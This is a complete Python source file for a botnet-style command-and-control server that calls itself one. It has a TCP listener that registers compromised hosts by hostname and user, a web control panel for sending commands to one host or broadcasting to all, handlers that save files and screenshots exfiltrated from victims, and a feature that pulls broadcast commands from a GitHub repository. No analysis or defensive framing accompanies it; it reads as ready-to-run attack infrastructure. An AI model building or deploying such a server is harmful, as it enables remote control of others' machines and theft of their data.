#!/usr/bin/env python3
"""
Replit C2 Server with GitHub Sync
"""
import os
import sys
import socket
import threading
import json
import base64
import time
import logging
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from flask_socketio import SocketIO, emit
import requests

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*")

# Global state
clients = {}
commands_queue = {}
clients_lock = threading.Lock()
GITHUB_REPO = "https://github.com/enkryptonloll/c2-server"

class ClientHandler:
    def __init__(self, client_socket, address):
        self.socket = client_socket
        self.address = address
        self.id = f"{address[0]}:{address[1]}"
        self.info = {}
        self.running = True
        
    def handle(self):
        logger.info(f"New connection: {self.id}")
        
        try:
            self.socket.settimeout(30)
            
            # Get client info
            data = self.socket.recv(4096).decode()
            if data.startswith("CONNECT|"):
                parts = data.split("|")
                self.info = {
                    'hostname': parts[1] if len(parts) > 1 else 'Unknown',
                    'username': parts[2] if len(parts) > 2 else 'Unknown',
                    'os': parts[3] if len(parts) > 3 else 'Unknown',
                    'arch': parts[4] if len(parts) > 4 else 'Unknown',
                    'connected': time.time()
                }
                
                with clients_lock:
                    clients[self.id] = {
                        **self.info,
                        'handler': self,
                        'last_seen': time.time(),
                        'ip': self.address[0]
                    }
                
                logger.info(f"Client registered: {self.info['hostname']} ({self.info['username']})")
                self.socket.send(b"READY")
                
                # Notify WebSocket
                socketio.emit('client_connect', {
                    'id': self.id,
                    **self.info
                })
                
                # Main loop
                while self.running:
                    try:
                        # Check for commands
                        if self.id in commands_queue and commands_queue[self.id]:
                            cmd = commands_queue[self.id].pop(0)
                            self.socket.send(f"CMD:{cmd}".encode())
                        
                        # Receive output
                        data = self.socket.recv(65536)
                        if not data:
                            break
                            
                        decoded = data.decode('utf-8', errors='ignore')
                        
                        if decoded.startswith("OUTPUT:"):
                            output = decoded[7:]
                            socketio.emit('command_output', {
                                'client_id': self.id,
                                'output': output[:500],
                                'timestamp': time.time()
                            })
                            
                        elif decoded.startswith("FILE:"):
                            self.handle_file(decoded)
                            
                        elif decoded.startswith("SCREENSHOT:"):
                            self.handle_screenshot(decoded)
                            
                        # Update last seen
                        with clients_lock:
                            if self.id in clients:
                                clients[self.id]['last_seen'] = time.time()
                                
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logger.error(f"Error with client {self.id}: {e}")
                        break
                        
        except Exception as e:
            logger.error(f"Handler error: {e}")
        finally:
            self.cleanup()
    
    def handle_file(self, data):
        try:
            parts = data[5:].split("|", 1)
            if len(parts) == 2:
                filename, content = parts[0], base64.b64decode(parts[1])
                os.makedirs("downloads", exist_ok=True)
                filepath = f"downloads/{self.id}_{filename}"
                with open(filepath, "wb") as f:
                    f.write(content)
                logger.info(f"File saved: {filepath}")
        except:
            pass
    
    def handle_screenshot(self, data):
        try:
            img_data = base64.b64decode(data[11:])
            os.makedirs("screenshots", exist_ok=True)
            filename = f"screenshots/{self.id}_{int(time.time())}.png"
            with open(filename, "wb") as f:
                f.write(img_data)
            logger.info(f"Screenshot saved: {filename}")
        except:
            pass
    
    def cleanup(self):
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        
        with clients_lock:
            if self.id in clients:
                del clients[self.id]
                socketio.emit('client_disconnect', {'id': self.id})
        
        logger.info(f"Client disconnected: {self.id}")

def tcp_server():
    """TCP server for client connections"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 6767))
    server.listen(10)
    
    logger.info(f"TCP Server listening on port 6767")
    
    while True:
        try:
            client_socket, address = server.accept()
            handler = ClientHandler(client_socket, address)
            thread = threading.Thread(target=handler.handle, daemon=True)
            thread.start()
        except Exception as e:
            logger.error(f"Server error: {e}")

# Flask Routes
@app.route('/')
def index():
    return render_template('index.html', repo_url=GITHUB_REPO)

@app.route('/api/clients')
def api_clients():
    with clients_lock:
        client_list = []
        for cid, info in clients.items():
            if 'handler' in info:
                continue
            client_list.append({
                'id': cid,
                'hostname': info.get('hostname', 'Unknown'),
                'username': info.get('username', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'ip': info.get('ip', 'Unknown'),
                'connected': info.get('connected', 0),
                'last_seen': info.get('last_seen', 0),
                'uptime': int(time.time() - info.get('connected', time.time()))
            })
    return jsonify(client_list)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing parameters'}), 400
    
    if client_id not in commands_queue:
        commands_queue[client_id] = []
    
    commands_queue[client_id].append(command)
    
    # Broadcast to WebSocket
    socketio.emit('command_sent', {
        'client_id': client_id,
        'command': command[:100],
        'timestamp': time.time()
    })
    
    return jsonify({'success': True})

@app.route('/api/broadcast', methods=['POST'])
def api_broadcast():
    data = request.json
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Missing command'}), 400
    
    with clients_lock:
        for client_id in clients:
            if client_id not in commands_queue:
                commands_queue[client_id] = []
            commands_queue[client_id].append(command)
    
    socketio.emit('broadcast_sent', {
        'command': command[:100],
        'clients_count': len(clients),
        'timestamp': time.time()
    })
    
    return jsonify({'success': True, 'clients': len(clients)})

@app.route('/api/github/sync', methods=['POST'])
def github_sync():
    """Sync commands from GitHub"""
    try:
        # Fetch commands from GitHub
        url = f"{GITHUB_REPO.replace('github.com', 'raw.githubusercontent.com')}/main/commands.json"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands.get('broadcast', []):
                with clients_lock:
                    for client_id in clients:
                        if client_id not in commands_queue:
                            commands_queue[client_id] = []
                        commands_queue[client_id].append(cmd)
            
            return jsonify({'success': True, 'commands_loaded': len(commands.get('broadcast', []))})
    except Exception as e:
        logger.error(f"GitHub sync error: {e}")
    
    return jsonify({'success': False}), 500

@app.route('/keepalive')
def keepalive():
    """Endpoint for uptime monitoring"""
    return jsonify({
        'status': 'online',
        'clients': len(clients),
        'timestamp': time.time(),
        'version': '1.0'
    })

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    logger.info("WebSocket client connected")
    emit('status', {'message': 'Connected to C2 Server'})

@socketio.on('get_clients')
def handle_get_clients():
    with clients_lock:
        client_list = []
        for cid, info in clients.items():
            if 'handler' in info:
                continue
            client_list.append({
                'id': cid,
                'hostname': info.get('hostname', 'Unknown'),
                'username': info.get('username', 'Unknown')
            })
        emit('clients_list', {'clients': client_list})

@socketio.on('send_command')
def handle_send_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id and command:
        if client_id not in commands_queue:
            commands_queue[client_id] = []
        commands_queue[client_id].append(command)
        emit('command_queued', {'client_id': client_id, 'command': command[:50]})

def start_servers():
    """Start TCP and Flask servers"""
    # Start TCP server in background
    tcp_thread = threading.Thread(target=tcp_server, daemon=True)
    tcp_thread.start()
    
    # Start Flask/SocketIO
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting web server on port {port}")
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == "__main__":
    # Create necessary directories
    os.makedirs("templates", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    os.makedirs("screenshots", exist_ok=True)
    
    # Create simple HTML template
    with open("templates/index.html", "w") as f:
        f.write("""<!DOCTYPE html>
<html>
<head>
    <title>C2 Server</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #0d1117; color: #c9d1d9; }
        .container { max-width: 1200px; margin: 0 auto; }
        .panel { background: #161b22; padding: 20px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; }
        .client { background: #21262d; padding: 10px; margin: 5px 0; border-radius: 4px; }
        button { background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
        button:hover { background: #2ea043; }
        textarea { width: 100%; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; border-radius: 6px; padding: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="panel">
            <h1>🕸️ C2 Server Control Panel</h1>
            <p>Connected Clients: <span id="client-count">0</span></p>
            <p>GitHub Repo: <a href="{{ repo_url }}" target="_blank">{{ repo_url }}</a></p>
            <button onclick="syncGitHub()">🔄 Sync from GitHub</button>
        </div>
        
        <div class="panel">
            <h2>📡 Connected Clients</h2>
            <div id="clients-list"></div>
        </div>
        
        <div class="panel">
            <h2>⚡ Command Control</h2>
            <p>Selected: <span id="selected-client">None</span></p>
            <textarea id="command" placeholder="Enter command..."></textarea><br>
            <button onclick="sendCommand()">Send to Selected</button>
            <button onclick="broadcastCommand()">Broadcast to All</button>
            <button onclick="location.reload()">Refresh</button>
        </div>
        
        <div class="panel">
            <h2>📊 Output</h2>
            <div id="output" style="height: 200px; overflow-y: auto; background: #0d1117; padding: 10px; border-radius: 4px;"></div>
        </div>
    </div>
    
    <script>
        const socket = io();
        let selectedClient = null;
        let clients = {};
        
        socket.on('connect', () => {
            console.log('Connected to server');
            socket.emit('get_clients');
        });
        
        socket.on('clients_list', (data) => {
            clients = data.clients.reduce((acc, client) => {
                acc[client.id] = client;
                return acc;
            }, {});
            
            updateClientList();
        });
        
        socket.on('client_connect', (data) => {
            clients[data.id] = data;
            updateClientList();
            addOutput(`Client connected: ${data.hostname} (${data.username})`);
        });
        
        socket.on('client_disconnect', (data) => {
            delete clients[data.id];
            updateClientList();
            addOutput(`Client disconnected: ${data.id}`);
        });
        
        socket.on('command_output', (data) => {
            addOutput(`[${data.client_id}] ${data.output}`);
        });
        
        function updateClientList() {
            const list = document.getElementById('clients-list');
            const count = document.getElementById('client-count');
            
            count.textContent = Object.keys(clients).length;
            list.innerHTML = '';
            
            for (const [id, client] of Object.entries(clients)) {
                const div = document.createElement('div');
                div.className = 'client';
                div.innerHTML = `
                    <strong>${client.hostname}</strong> (${client.username})<br>
                    ID: ${id}
                    <button onclick="selectClient('${id}')">Select</button>
                `;
                list.appendChild(div);
            }
        }
        
        function selectClient(clientId) {
            selectedClient = clientId;
            document.getElementById('selected-client').textContent = 
                `${clients[clientId].hostname} (${clientId})`;
        }
        
        function sendCommand() {
            if (!selectedClient) {
                alert('Select a client first!');
                return;
            }
            
            const command = document.getElementById('command').value;
            if (!command.trim()) return;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: selectedClient, command: command})
            }).then(r => r.json()).then(data => {
                addOutput(`Command sent to ${selectedClient}: ${command.substring(0, 50)}...`);
                document.getElementById('command').value = '';
            });
        }
        
        function broadcastCommand() {
            const command = document.getElementById('command').value;
            if (!command.trim()) return;
            
            fetch('/api/broadcast', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            }).then(r => r.json()).then(data => {
                addOutput(`Broadcast to ${data.clients} clients: ${command.substring(0, 50)}...`);
                document.getElementById('command').value = '';
            });
        }
        
        function syncGitHub() {
            fetch('/api/github/sync', {method: 'POST'})
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        addOutput(`Synced ${data.commands_loaded} commands from GitHub`);
                    } else {
                        addOutput('GitHub sync failed');
                    }
                });
        }
        
        function addOutput(text) {
            const output = document.getElementById('output');
            const div = document.createElement('div');
            div.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        }
        
        // Auto-refresh clients every 30 seconds
        setInterval(() => socket.emit('get_clients'), 30000);
    </script>
</body>
</html>""")
    
    start_servers()
